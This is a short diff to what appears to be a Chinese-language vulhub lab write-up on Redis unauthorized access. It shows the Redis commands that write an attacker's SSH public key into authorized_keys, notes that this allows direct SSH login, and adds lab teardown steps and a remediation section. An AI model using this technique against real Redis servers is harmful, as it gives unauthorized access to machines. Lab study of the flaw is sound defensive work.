@@ -33,6 +33,15 @@ config set dbfilename "authorized_keys"
 set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
 save
 ```
+save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务器。
+
+
+## 销毁靶场
+```
+cd vulhub/redis/4-unacc
+docker‑compose down
+```
+
 
 ## 修复方案
 1. 修改 redis 配置，设置 bind 127.0.0.1，只允许本机访问，禁止 0.0.0.0 对外开放。
